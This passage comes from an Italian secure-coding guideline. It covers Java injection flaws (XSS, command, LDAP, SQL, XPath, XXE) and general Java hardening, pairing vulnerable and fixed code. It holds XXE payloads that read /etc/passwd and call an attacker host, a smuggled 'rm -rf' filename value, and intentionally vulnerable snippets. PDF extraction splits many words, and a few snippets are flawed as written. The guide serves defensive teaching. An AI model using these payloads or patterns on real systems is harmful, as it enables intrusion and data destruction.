per lunghi periodi. Ad esempio, le chiavi crittogra fiche devono permanere in memoria solo per il 
tempo necessario al loro utilizzo e devono essere s ovrascritte con dati casuali o “garbage data” al 
termine del loro impiego; 
• I dati critici non devono mai essere serializzati. 
7.2  Java 
Java è un linguaggio di programmazione orientato ag li oggetti, derivato dal C++ e progettato a partire  dal 
1991 da James Gosling assieme ad un gruppo di dipen denti di Sun Microsystems. Il suo duraturo successo  è 
da attribuire al suo orientamento verso il mondo we b, al suo modello object oriented e alla sua peculi arità 
di poter esserere eseguito su qualsiasi sistema ope rativo, mediante l’esecuzione di un bytecode, un 
intermedio di compilazione, su virtual machine.  
Java si è rivelato vincente, oltre che nello svilup po di applicazioni web, anche nella progettazione d i 
applicazioni client-server e nello sviluppo di web services.  
Nel 2010 Oracle Corporation ha rilevato Sun Microsy stems, continuando a sviluppare il linguaggio Java,   
apportamdovi migliorie rilevanti, che lo rendono un  linguaggio potente, flessibile e al passo coi temp i. 
 
Di seguito le principali vulnerabilità e le relativ e contromisure da adottare. 
7.2.1  Cross-site scripting (XSS) 
Come riconoscerla 
Reflected XSS . Si tratta di inoculare e far eseguire script dann osi all’interno di una pagina web. Il mezzo 
attraverso il quale quest’attacco viene perpetrato è la contraffazione dell’input. 
Quando l’input viene racchiuso nella risposta senza  esser filtrato, siamo in presenza di un reflected XSS. 
Stored XSS . In questo caso il codice HTML o lo script incorpo rato attraverso l’input viene memorizzato 
permanentemente sulla pagina e diventa parte integr ante di essa. Dopo un attacco riuscito, tutti gli u tenti 
che accederanno alla pagina saranno potenzialmente vittime dello script installato abusivamente. 
Si pensi, ad esempio, a un blog che consente di ins erire dei commenti o delle recensioni. Se non vi è alcun 
controllo sull’input utente, tag html e script inse riti da un attaccante diverranno parte integrante d ella 
pagina, una volta che il commento sarà pubblicato. 
 
 
Linee guida per lo sviluppo sicuro Pag. 61  a 156  
 
Come difendersi 
Per prima cosa, occorre convalidare tutti gli input , indipendentemente dalla loro provenienza: la 
convalidazione dovrebbe essere basata su una white list (una lista di valori ammessi), per cui verrebb ero 
accettati solo i dati che corrispondono, e verrebbe ro rifiutati tutti gli altri. 
Occorre controllare, oltre che i valori siano fra q uelli ammessi o che rientrino in un determinato int ervallo 
di validità, se corrispondano alle attese anche il tipo, la dimensione e il formato dei dati in input.  
Un altro accorgimento consiste nel codificare compl etamente tutti i dati dinamici (encoding) in modo d a 
neutralizzare eventuali inserimenti malevoli. La li breria ESAPI fornisce funzioni di encryption per un a grande 
varietò di tipologie di input atteso La codifica do vrebbe essere sensibile al contesto, in base al tip o di dato 
che si vuole neutralizzare: se ci si aspetta che po ssa esserci codice HTML abusivo, occorre codificare  gli 
eventuali tag HTML, se ci si potrebbe trovare di fr onte a uno script, allora bisogna codificare gli el ementi 
sintattici di Javascript, ecc. 
Definire in modo esplicito la codifica dei caratter i (charset) per l'intera pagina nell'intestazione d i risposta 
HTTP Content-Type. 
Impostare il flag HttpOnly a true, per evitare tent ativi di furto tramite la lettura tramite script de i cookie di 
sessione. 
Esempio:  
Nel codice che segue, un valore preso dalla request  viene scritta direttametne sulla response: 
String nomeUtente = request.getParameter("nome"); 
response.getWriter().write("Nome Utente: " + nomeUt ente); 
Il rimedio consiste nel filtrare il valore in input : 
response.getWriter().write(ESAPI.encoder().encodeFo rHTML 
( request.getParameter( "nome" ) ); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html,   
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
7.2.2  Code injection 
Come riconoscerla 
Accade quando l’applicazione utilizza, concatenando le, stringhe in input non bonificate. L’attaccante 
potrebbe introdurvi script che potrebbero essere es eguiti direttamente nell’application server. Ciò 
potrebbe portare ad azioni indesiderate. È simile a l Cross Site Scripting, ma qui il codice introdotto  non 
viene integrato nella pagina HTML, ma viene eseguit o a sé. 
Come difendersi 
Evitare di eseguire del codice dinamicamente, speci almente se costruito a partire da input proveniente  
dall’esterno. 
Occorre verificare sempre l’input, fissando control li rigidi che impediscano di immettere caratteri e tipi di 
dati potenzialmente dannosi. L’optimum è designare una white list di valori ammessi e scartare tutto c iò 
che non vi rientra. 
 
Esempio : 
Il seguente codice permette di eseguire un file pun tato dinamicamente in base al valore dell’input 
proveniente dall’esterno, senza controlli. 
 
public class CodeInjection { 
 static void main(String[] args){ 
  System.load(args[0]); 
 } 
} 
 
Nel codice seguente, l’input viene controllato cont ro una white list di valori ammessi: 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 62  a 156  
 
public class CodeInjectionFixed { 
 static void main(String[] args){ 
  String fileName = null; 
  switch(args[0]){ 
  case "First": 
   fileName="First.txt"; 
   break; 
  case "Second": 
   fileName="Second.txt"; 
   break; 
  case "Third": 
   fileName="Third.txt"; 
   break; 
  default : 
   fileName="none.txt"; 
  } 
  System.load(fileName); 
 } 
} 
 
Si veda: http://cwe.mitre.org/data/definitions/94.html,  
CWE-94: Improper Control of Generation of Code ('Co de Injection'). 
7.2.3  Command injection 
Come riconoscerla 
Accade quando l’applicazione esegue comandi di sist ema operativo sul server che la ospita. Un attaccan te 
potrebbe utilizzare questa caratteristica per esegu ire comandi dannosi. 
Si realizza nel momento in cui un’applicazione prev ede un’istruzione che lancia comandi sul sistema 
operativo utilizzando un input non verificato. Coma ndi arbitrari potrebbero: 
• Alterare i permessi su file e directory del file sy stem, (read / create / modify / delete). 
• Permettere delle connessioni di rete non autorizzat e verso il server da parte dell'attaccante. 
• Avviare e fermare servizi di sistema. 
• Consentire all’attaccante il controllo completo del  server da parte dell'attaccante. 
 
Attraverso questa vulnerabilità l'applicazione vien e indotta ad eseguire dei comandi voluti dall'utent e 
malintenzionato. L'operazione spesso viene effettua ta concatenando stringhe di input dell'utente a cod ice 
dannoso. Potrebbero così essere eseguiti direttamen te sul server comandi anche molto pericolosi per il  
sistema o per la sicurezza dei dati. 
Come difendersi 
• Scrivere il codice in modo che non esegua nessuna s hell dei comandi. Utilizzare a questo scopo le 
API messe a disposizione delle librerie Java; 
• Se dovessero permanere shell dirette, fare in modo che siano stringhe statiche che non utilizzino 
l’input dell’utente; 
• In ogni caso occorre validare l’input, filtrando i caratteri pericolosi, attraverso una struttura defi nita 
per l’input, o – meglio ancora – imponendo una whit e list di valori ammessi. 
 
Esempio: 
Caso in cui si potrebbe avere command injection: 
public class CommandInjection { 
 public static void main(String[] args) throws IOEx ception { 
  Runtime runtime = Runtime.getRuntime(); 
  Process proc = runtime.exec( "fileNumber"  + args[ 0] + ".exe" ); 
 } 
} 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 63  a 156  
 
Nel codice seguente, invece, l’injection non sarebb e possibile, poiché l’input è un numero e non una 
stringa:  
public class CommandInjectionFixed { 
 public static void main(String[] args) throws IOEx ception { 
  int num = Integer.parseInt(args[0]); 
  // Controlli sul numero immesso 
  Runtime runtime = Runtime.getRuntime(); 
  Process proc = runtime.exec( "fileNumber"  + Integer.toString(num)  + ".exe" ); 
 } 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/77.html,   
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
7.2.4  Connection string injection 
Come riconoscerla 
La stringa di connessione è un insieme di coppie ch iave/valore separate da un punto e virgola. Consent ono 
alle applicazioni Web di connettersi al database o ad altro server (per esempio Active Directory). Se 
un'applicazione Web crea una stringa di connessione  utilizzando la concatenazione di stringhe dinamich e, 
per connettersi al database in base all'input forni to dagli utenti, tale applicazione Web è vulnerabil e 
all'attacco di iniezione della stringa di connessio ne. 
Come in tutti i casi di injection, anche qui parame tri di input non verificati possono essere utilizza ti per  
Come difendersi 
La validazione dell’input, avvalendosi di una white  list, filtrando i caratteri pericolosi, è sempre l a soluzione 
corretta per questo tipo di vulnerabilità. In quest o caso i parametri non dovrebbero includere segni s peciali 
come il punto e virgola, separatore delle varie cop pie chiave/valore. 
 
Esempio :  
Il seguente codice: 
public class ConnectionStringInjection { 
 public static void main(String[] args) throws SQLE xception { 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter url name: "); 
  String connURL = userInputScanner.nextLine(); 
  Connection con = DriverManager.getConnection(conn URL, "username" , 
"password" ); 
 } 
} 
Andrebbe corretto come segue: 
public class ConnectionStringInjectionFixed { 
 public static void main(String[] args) throws SQLE xception { 
 HashMap<String, String> sanitize = new HashMap<Str ing, String>(); 
  sanitize.put("DB_url_1", "DB_url_1"); 
  sanitize.put("DB_url_2", "DB_url_2"); 
  sanitize.put("DB_url_3", "DB_url_3"); 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter url name: "); 
  String connURL = userInputScanner.nextLine(); 
  Connection con = DriverManager.getConnection(sani tize.get(connURL), 
"username", "password"); 
 } 
} 
 
Il valore è valido se è uno di quelli memorizzati n ell’hashmap sanitize . 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,   
 
 
Linee guida per lo sviluppo sicuro Pag. 64  a 156  
 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.2.5  LDAP Injection 
Come riconoscerla 
LDAP è una base dati che censisce in forma di direc tory le utenze del sistema. Se l’input dell’utente viene 
utilizzato, senza subire alcun controllo o filtro, per comporre una query LDAP, è facilmente intuibile  come 
possa trasformarsi in un mezzo per sferrare un atta cco di LDAP injection. 
Il danno che può derivarne dipende da quanto la dir ectory delle utenze venga inquinata.  
Con un attacco di LDAP injection è possibile legger e dati riservati, come è possibile modificarli, can cellarli o 
inserire utenze che poi possono essere utilizzate p er successivi attacchi. 
Se nomeUtente è “Mario Rossi”, la query restituirà i dati relativi all’utente in questione, ma se vien e fornito 
il carattere “*”, verrà restituito l’intera directo ry di utenze.  
Come difendersi 
Come in altri tipi di injection è fondamentale il c ontrollo e l’encoding dell’input, se deve servire p er 
costruire filtri e query verso server LDAP. 
L’encoding deve filtrare i seguenti caratteri: \ # + < > , ; " =  
Altri caratteri scpeciali sono utilizzati all’inter no delle query LDAP e quindi non possono essere eli minati in 
automatico:  * ( ) . & - _ [ ] ` ~ | @ $ % ^ ? : { } ! ' 
Il controllo applicativo, dipendente dal contesto, assume un’importanza fondamentale. 
Anche ridurre al minimo i privilegi assegnati all’u tenza con la quale il server LDAP è avviato è una m isura 
utile a minimizzare le conseguenze di un attacco. 
 
Esempio: 
Il seguente codice riceve un userid e password in i nput per comporre una query LDAP. 
 
private void searchRecord(String userSN, String use rPassword) throws 
NamingException { 
  Hashtable < String, String > env = new Hashtable < String, String > (); 
  env.put(Context.INITIAL_CONTEXT_FACTORY, 
"com.sun.jndi.ldap.LdapCtxFactory"); 
  try { 
    DirContext dctx = new InitialDirContext(env); 
    SearchControls sc = new SearchControls(); 
    String[] attributeFilter = { 
      "cn", 
      "mail" 
    }; 
    sc.setReturningAttributes(attributeFilter); 
    sc.setSearchScope(SearchControls.SUBTREE_SCOPE) ; 
    String base = "dc=example,dc=com"; 
    // The following resolves to (&(sn=S*)(userPass word=*)) 
    String filter = "(&(sn=" + userSN + ")(userPass word=" + userPassword + 
"))"; 
    NamingEnumeration << ? > results = dctx.search( base, filter, sc); 
    while (results.hasMore()) { 
      SearchResult sr = (SearchResult) results.next (); 
      Attributes attrs = (Attributes) sr.getAttribu tes(); 
      Attribute attr = (Attribute) attrs.get("cn");  
      System.out.println(attr); 
      attr = (Attribute) attrs.get("mail"); 
      System.out.println(attr); 
    } 
    dctx.close(); 
  } catch (NamingException e) { 
 
 
Linee guida per lo sviluppo sicuro Pag. 65  a 156  
 
    // Forward to handler 
  } 
}  
 
Nel seguente snippet viene effettuato un controllo che impedisce l’injection: 
// ... beginning of LDAPInjection.searchRecord()...  
sc.setSearchScope(SearchControls.SUBTREE_SCOPE); 
String base = "dc=example,dc=com"; 
if (!userSN.matches("[\\w\\s]*") || !userPassword.m atches("[\\w]*")) { 
throw new IllegalArgumentException("Invalid input") ; 
} 
String filter = "(&(sn = " + userSN + ")(userPasswo rd=" + userPassword + "))"; 
// ... remainder of LDAPInjection.searchRecord()...  
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html,   
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.2.6  Resource Injection 
Come riconoscerla 
Si verifica quando l’applicazione ha la necessità d i far aprire un socket da parte dell’utente. Un 
malintenzionato potrebbe aprire una backdoor che pe rmette di connettersi direttamente al server, facen do 
escalation dei privilegi fino a prendere il control lo della macchina. Tramite questa vulnerabilità il 
malintenzionato potrebbe utilizzare eventuali conne ssioni aperte dall'utente, nel caso non fossero ges tite 
adeguatamente. 
Come difendersi 
Non si deve in alcun caso consentire a un utente di  definire i parametri relativi ai sockets di rete. 
Validare l’input raffrontandolo con una white list di valori possibili ammessi. 
 
Esempio: 
La situazione iniziale: 
 
public class ResourceInjection { 
 public static void main(String[] args) { 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter port number: "); 
  int portNumber  = Integer.parseInt(userInputScanner.nextLine()); 
  try { 
   ServerSocket serverSocket = new ServerSocket(por tNumber); 
  } catch (Exception e) { 
   System.err.println("Caught Exception: " + e.getM essage()); 
  } 
 } 
} 
 
Questa vulnerabilità viene risolta limitando le pos sibilità a poche scelte (white list): 
 
public class ResourceInjectionFixed { 
 public static void main(String[] args) { 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter port name: "); 
  String portName = userInputScanner.nextLine(); 
  int portNum; 
  switch (portName) { 
  case "ftps": 
   portNum = 989; 
   break; 
  case "ftp": 
   portNum = 20; 
 
 
Linee guida per lo sviluppo sicuro Pag. 66  a 156  
 
   break; 
  case "smtp": 
   portNum = 25; 
   break; 
  default: 
   portNum = 80; 
  } 
  try { 
   ServerSocket serverSocket = new ServerSocket(por tNum); 
  } catch (Exception e) { 
   System.err.println("Caught Exception: " + e.getM essage()); 
  } 
 } 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,   
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.2.7  SQL injection 
Come riconoscerla  
Si verifica quando l’input non verificato viene uti lizzato per comporre dinamicamente uno statement SQ L 
che poi verrà eseguito sulla base dati. Adeguatamen te manipolati, i parametri di input possono modific are 
le query in maniera sostanziale, causando danni di impatto notevole, come l’inserimento di dati malevo li, la 
cancellazione e la modifica di record e la rivelazi one indebita di informazioni riservate. Se i dati u tilizzati per 
la SQL injection sono memorizzati nel database o ne l file system in generale, si parla di SQL injectio n di 
second’ordine (second order SQL injection). 
Come difendersi  
• Come prima misura, occorre validare l’input, sottop onendolo a rigidi controlli, come già illustrato 
nei punti precedenti; 
• Le query SQL non devono mai essere realizzate conca tenando stringhe con l’input esterno. Si 
devono invece utilizzare componenti di database sic uri come le stored procedure, le query 
parametrizzate e le associazioni degli oggetti (per  comandi e parametri; 
• Una soluzione che può essere d’aiuto consiste nell’ utilizzazione di una libreria ORM, come 
EntityFramework, Hibernate o iBatis; 
• Occorre limitare l'accesso agli oggetti e alle funz ionalità del database, in base al "Principle of Lea st 
Privilege" (non fornire agli utenti permessi superi ori a quelli strettamente necessari. 
 
Esempio : 
Codice vulnerabile 
String q='SELECT r FROM User r where r.userId=''+us er+'''; 
Query query=em.createQuery(q); 
List users=query.getResultList();  
 
Codice sicuro 
Query query=em.createNamedQuery('User.findByUserId' ); 
query.setParameter('userId', user); 
List users=query.getResultList(); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,   
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.2.8  XPath injection 
Come riconoscerla 
 
 
Linee guida per lo sviluppo sicuro Pag. 67  a 156  
 
Si ha quando l’applicazione interroga un documento xml usando una query XPath testuale, creata 
concatenando dinamicamente le istruzioni con string he provenienti dall’esterno. L’attaccante potrebbe 
immettere una stringa che modifica la query XPath, ottenendo dal documento xml informazioni non 
dovute. Se l'input è stato manipolato ad arte, dura nte l'esecuzione dell'applicazione parti del docume nto 
xml, che non dovevano essere raggiunte, vengono ind ebitamente estratte e lette. 
La gravità dell’attacco dipende dal tipo di dati ch e è possibile estrarre dal documento xml. Se contie ne dati 
personali riservati, il furto di informazioni può r ealizzare un data breach; nel caso di dati account,  l’attacco 
può prefigurare ulteriori attacchi di spoofing ed e levation of privileges. 
Come difendersi 
Come prima cosa, occorre procedere con la validazio ne dell’input, come in tutti i casi di injection, 
adottando le precauzioni illustrate nei punti prece denti, tra le quali la depurazione della stringa da  tutti i 
caratteri potenzialmente dannosi. La’adozione di un a white list di valori ammessi è sempre un’ottima 
soluzione. 
 
Evitare che la costruzione della query XPath sia di pendente dalle informazioni inserite dall'utente. S i deve 
mappare la query di tipo XPath con i parametri uten te mantenendo la separazione tra dati e codice. Nel  
caso fosse necessario includere l'input dell’utente  nella query, l'input stesso dovrà essere prima val idato 
correttamente. 
 
Esempio: 
public class XPath_Injection { 
 public static void main(String[] args) { 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter XPath expression: "); 
  String expression = userInputScanner.nextLine(); 
 
  // read a string value 
  XPath XPath = XPathFactory.newInstance().newXPath (); 
  try { 
   XPathExpression email = XPath.compile(expression ); 
  } catch (XPathExpressionException e) { 
   e.printStackTrace(); 
  } 
 } 
} 
 
L’input dell’utente deve essere ricondotto a valori  ammessi (white list): 
public class XPath_Injection_Fixed { 
 public static void main(String[] args) { 
  HashMap<String, String> sanitize = new HashMap<St ring, String>(); 
  sanitize.put("student", "/class/student"); 
  sanitize.put("graduate", "/class/graduate"); 
  sanitize.put("professor", "/class/professor"); 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter XPath expression: "); 
  String expression = userInputScanner.nextLine(); 
 
  // read a string value 
  XPath XPath = XPathFactory.newInstance().newXPath (); 
  try { 
   XPathExpression email = XPath.compile(sanitize.g et(expression)); 
  } catch (XPathExpressionException e) { 
   e.printStackTrace(); 
  } 
 } 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitr e.org/data/definitions/643.html,  
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 68  a 156  
 
7.2.9  XML External Entity (XXE) injection 
Come riconoscerla  
Se l’applicazione web riceve in input un documento XML che consente l‘elaborazione di entità esterne, 
dichiarate nel DTD, il sistema potrebbe essere espo sto a possibili attacchi di tipo XXE. Se viene effe ttuato il 
parsing di entità create ad arte, come nell’esempio  seguente, potrebbero essere visualizzate dall’atta ccante 
le password di sistema oppure eseguito del codice m alevolo. 
Esempio: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
Come difendersi 
• Bisogna evitare di incorporare entità esterne. 
• Occorre assicurarsi di disabilitare il parser dal c aricamento automatico di entità esterne. 
• Formati di dati meno complessi, come JSON, possono rendere più difficile la serializzazione di dati 
sensibili. 
• Devono essere apportati i necessari aggiornamenti a  tutti i parser e alle librerie XML in uso da parte  
dell'applicazione o sul sistema operativo sottostan te.  
• Se viene utilizzato SOAP, occorre aggiornarlo alla versione 1.2 o successive. 
• Implementare la convalida dell’input come evidenzia to in altri punti. 
• Verificare che la funzionalità di caricamento di fi le XML o XSL convalidI l'XML in entrata utilizzando  
uno schema XSD. 
 
Esempio : 
Formato non corretto 
/* Carica il documento XML e ne mostra il contenuto  */ 
String maliciousSample = "xxe.xml"; 
XMLInputFactory factory = XMLInputFactory.newInstan ce(); 
 
try (FileInputStream fis = new FileInputStream(mali cousSample)) { 
  // Load XML stream 
  XMLStreamReader xmlStreamReader = factory.createX MLStreamReader(fis);  // Non 
sicuro; xmlStreamReader risulta vulnerabile 
 
Formato corretto 
/* Carica il documento XML e ne mostra il contenuto  */ 
String maliciousSample = "xxe.xml"; 
XMLInputFactory factory = XMLInputFactory.newInstan ce(); 
 
// disabilita la risoluzione di entità esterne 
factory.setProperty(XMLInputFactory.IS_SUPPORTING_E XTERNAL_ENTITIES, 
Boolean.FALSE); 
 
// oppure disabilita completamente i DTDs 
factory.setProperty(XMLInputFactory.SUPPORT_DTD, Bo olean.FALSE); 
 
try (FileInputStream fis = new FileInputStream(mali cousSample)) { 
    // Carica il document XML 
    XMLStreamReader xmlStreamReader = factory.creat eXMLStreamReader(fis); 
 
7.2.10  Ulteriori indicazioni per lo sviluppo sicuro 
La seguente raccolta di Best Practices è riconosciu ta ufficialmente da Oracle Java.  
 
 
Linee guida per lo sviluppo sicuro Pag. 69  a 156  
 
7.2.10.1  Inizializzazione 
Variabili e oggetti, prima di essere utilizzati, de vono essere correttamente inizializzati. Per evitar e 
l’allocazione di oggetti non inizializzati: 
• rendere tutte le variabili private e, se necessario , fornire l’accesso ad esse dall’esterno 
esclusivamente attraverso i metodi get() e set(); 
• aggiungere in ogni oggetto una variabile booleana p rivata (es: isInizialized) e fare in modo che ogni 
costruttore, come ultima operazione, la inizializzi  a “true“;  
• in ogni metodo che non sia un costruttore, verifica re che la variabile di inizializzazione della class e 
sia impostata a true prima di eseguire qualsiasi op erazione. 
 
Esempio: 
public class MyClass { 
 private boolean isInizialized; 
 private String nome; 
 public MyClass(String nome){ 
 this.nome = nome; 
 this.isInizialized = true; 
 } 
 public String getNome(){ 
 return (isInizialized == true ? this.nome : null);  
 } 
} 
 
Se la classe ha costruttori statici è necessario se guire la stessa procedura ma a livello di classe: 
• rendere tutte le variabili statiche private e, se n ecessario fornirne l’accesso dall’esterno della cla sse 
stessa: questo deve sempre essere consentito esclus ivamente attraverso i metodi get() e set(); 
• aggiungere alla classe una variabile booleana priva ta statica (es: isClassInizialized) e fare in modo 
che ogni costruttore statico, come ultima operazion e, la inizializzi a “true“; 
• prima di eseguire qualsiasi operazione, in ogni met odo statico ed ogni costruttore si deve verificare 
che la variabile “isClassInitialized” sia impostata  a “true“; 
• Gestione delle allocazioni / deallocazioni di memor ia dinamica; 
 
Prima di uscire da una classe occorre ricordarsi se mpre di azzerare il contenuto delle variabili. Si s upponga, 
nel seguente esempio, che la variabile k contenesse  la chiave per decriptare un messaggio cifrato: 
 
Esempio : 
Forma non corretta 
public class Decodificatore { 
private byte[] k; 
} 
Forma corretta 
public class Erase { 
private byte[] k; 
public void clear() { 
for(int i = 0; i < k.length; i++) 
k [i] = (byte) 0x00; 
} 
} 
Limitare l’accesso alle classi, ai metodi e alle va riabili. 
Ogni classe, metodo e variabile dovrebbero essere d efiniti come private o protected. Potrebbero essere  
dichiarati”public” in casi del tutto eccezionali, m otivati e documentati. Ogni variabile privata deve essere 
accessibile dall’esterno unicamente attraverso meto di set() e get() per mantenere l’oggetto al sicuro.   
 
Esempio : 
public class Studente { 
 private int eta; 
 public int getEta(){ 
 
 
Linee guida per lo sviluppo sicuro Pag. 70  a 156  
 
  return this.eta; 
 } 
 public int setEta(int eta){ 
  this.eta = eta; 
 } 
} 
 
Ogni costante deve essere definita con i modificato ri “static final” per garantire che il valore non s ia 
modificato e sia accessibile staticamente.  
 
Esempio : 
static final int key = 1; 
7.2.10.2  Visibilità 
Classi, metodi e variabili devono essere esplicitam ente marcate come private, protette o pubbliche, pe r 
limitare il livello di accesso da parte di altri og getti. Laddove non è necessario esporre delle funzi onalità, 
deve essere impostato un livello di visibilità più ristretto, al fine di evitare l’esposizione di stru tture interne. 
7.2.10.3  Modificatori 
Ove possibile, è necessario rendere le classi, i me todi e le variabili di tipo “final”.  
L'utilizzo di questo modificatore consente di aumen tare l'efficienza del programma in fase di esecuzio ne, in 
quanto non consente il "late binding". 
 
Esempio: 
public final class MyFinalClass { 
[...] 
} 
 
public class MyClass { 
  final int myConst = 123; 
[...] 
} 
 
public class MyClass { 
  [...] 
  public final void stopOverriding() { 
  [...] 
  } 
} 
 
Le variabili di tipo static dovrebbero essere limit ate allo stretto necessario, poiché la loro visibil ità prescinde 
dal ciclo di vita degli oggetti e sono perciò meno controllabili. Le variabili statiche sono globali e  in un 
ambiente multitutente possono essere modificate da più thread, con risultati imprevedibili. 
7.2.10.4  Utilizzo degli oggetti mutevoli 
Un metodo non dovrebbe mai tornare oggetti mutevoli  (ad esempio array, liste, vettori, date, etc..)  e  non 
dovrebbero mai essere memorizzati internamente in m odo diretto (dovrebbero invece essere 
opportunamente clonati). Si tratta di oggetti raggi unti per indirizzo, per cui tornare un array privat o da un 
metodo pubblico, esporrebbe i dati a possibili mani polazioni da parte di un attaccante.  
 
Esempio 1: 
Forma non corretta: 
public Date getDate() { 
return fDate; 
} 
Forma corretta: 
public Date getDate() { 
return new Date(fDate.getTime()); 
 
 
Linee guida per lo sviluppo sicuro Pag. 71  a 156  
 
} 
 
Esempio  2: 
Forma non corretta: 
public void useDate(Date date) { 
if (isValid(date)) 
scheduleTask(date); 
} 
Forma corretta: 
public void useDate(Date date) { 
Date copied_date = new Date(date.getTime()); 
if (isValid(copied_date))  
scheduleTask(copied_date); 
} 
7.2.10.5  Definizione delle classi 
Evitare l’utilizzo di classi interne (inner classes ). In casi del tutto eccezionali, comunque, le clas si interne 
devono sempre essere definite come private.  
 
Esempio: 
Forma non corretta: 
package esempio; 
public class MyFirstClass { 
  [...] 
  private class MySecondClass { 
  } 
  [...] 
} 
Forma corretta: 
package esempio; 
public class MyFirstClass { 
[...] 
} 
class MySecondClass { 
[...] 
} 
Per tener conto dei rilasci, è opportuno inserire u n codice di versione per ogni classe, collocandolo 
all’interno di una variabile pubblica final, ed eff ettuare i controlli per la coerenza di versione sul le classi del 
package. 
7.2.10.6  Codice e permessi speciali 
Le classi Java non dovrebbero effettuare operazioni  di sistema diretti. Non dovrebbero cambiare i perm essi 
sul file system, né aprire socket, né caricare libr erie dinamiche attraverso la System.loadLibrary o l a 
Runtime.getRuntime.loadlibrary, ecc. 
Se una di queste operazioni dovessere rendersi nece ssaria, occorrerà documentarne le motivazioni e 
procedere con lo sviluppo nella massima sicurezza.  
In generale, come già accennato, minori sono i priv ilegi, più è sicura l’applicazione. 
7.2.10.7  Esecuzione dei comandi di sistema 
Supponiamo che un aggressore assegni alla variabile  filename un valore del tipo:  
filename =“joe; /bin/rm –rf /*”; 
Nell’esempio sotto riportato verrà eseguito il codi ce malevolo (forma non corretta); nella forma corre tta, il 
codice malevolo sarà, invece, ignorato. 
 
Esempio: 
Forma non corretta: 
void method (String filename) { 
System.exec("more " + filename);  
 
 
Linee guida per lo sviluppo sicuro Pag. 72  a 156  
 
} 
Forma corretta: 
void method (String filename){ 
if (new File(filename).exists()){  
 // Controlli di white list …. 
System.exec("more " + filename); 
} 
} 
7.2.10.8  Oggetti 
Per ragioni di sicurezza è necessario rendere le cl assi e gli oggetti non clonabili. Di seguito viene riportato 
un esempio su come è possibile rispettare questa re gola: 
[...] 
public final void clone() throws java.lang.CloneNot SupportedException { 
  throw new java.lang.CloneNotSupportedException();  
} 
[...] 
Nei casi eccezionali, che dovrebbero essere motivat i e ampiamente documentati, bisogna etichettare i 
metodi che consentono la clonazione di tipo “final” , in modo da evitare potenziali un loro malevolo 
override. Di seguito viene riportato un esempio su come è possibile gestire queste eccezioni: 
[...] 
public final void clone() throws java.lang.CloneNot SupportedException { 
  super.clone(); 
} 
  [...] 
Comparazione degli oggetti di classe. Non effettuar e mai la comparazione per nome degli oggetti di cla sse. 
Di seguito viene riportato un esempio su come è pos sibile rispettare questa regola: 
 
Esempio: 
Forma non corretta: 
public class MyClass { 
  public boolean sameClass (Object o) { 
    Class thisClass = this.getClass(); 
    Class otherClass = o.getClass(); 
    return (thisClass.getName() == otherClass.getNa me()); 
  } 
} 
Forma corretta: 
package esempio; 
public class MyClass { 
  public boolean sameClass (Object o) { 
    Class thisClass = this.getClass(); 
    Class otherClass = o.getClass(); 
    return (thisClass == otherClass); 
  } 
} 
7.2.10.9  Serializzazione e deserializzazione 
Rendere le classi e gli oggetti non serializzabili.  Di seguito viene riportato un esempio su come è po ssibile 
rispettare questa regola: 
[...] 
private final void writeObject(ObjectOutputStream o ut) throws java.io.IOException 
{ 
   throw new java.io.IOException("L’oggetto non può  essere serializzato "); 
} 
[...] 
Rendere le classi e gli oggetti non deserializzabil i. Di seguito un esempio su come è possibile rispet tare 
questa regola: 
[...] 
private final void readObject(ObjectInputStream in)  throws java.io.IOException { 
   throw new java.io.IOException("L’oggetto non può  essere deserializzato"); 
} 
 
 
Linee guida per lo sviluppo sicuro Pag. 73  a 156  
 
[...] 
 
Utilizzare una libreria esterna come SerialKiller è  molto utile per mettere le classi Java al riparo d alla 
vulnerabilità nota come “unsecure serialization”.  In pratica produce una sottoclasse “sicura “ della classe 
usata da Java per la deserializzazione: ObjectInput Stream. 
Il codice Java, dopo aver importato tale libreria, viene modificato come segue: 
 
Formato vulnerabile: 
ObjectInputStream ois = new ObjectInputStream(is); 
String msg = (String) ois.readObject();  
 
Formato sicuro: 
ObjectInputStream ois = new SerialKiller(is, "/etc/ serialkiller.conf"); 
String msg = (String) ois.readObject(); 
 
7.2.10.10  Memorizzazione delle informazioni riservate 
Non inserire all’interno del codice informazioni ri servate, come chiavi crittografiche, passwords, cer tificati, 
etc. Informazioni personali non devono mai essere i nserite in chiaro né devono essere presenti all’int erno 
del codice o lasciati nella cache. 
7.2.10.11  Packages 
Creazione dei packages  
I packages devono essere concepiti per organizzare in una forma logica le classi dell’applicazione; un  
package deve contenere funzionalità simili e omogen ee. 
 
Protezione dei packages 
È necessario proteggere i package a livello globale , contro l’immissione di codice malevolo o alterato . Di 
seguito vengono riportati due esempi su come rispet tare questa regola: 
Esempio: 
// Inserire la seguente linea nel file java.securit y properties. 
// Ciò causerà un’eccezione nel loader defineClass non appena 
// si proverà a definire una nuova classe all’inter no del pacchetto, 
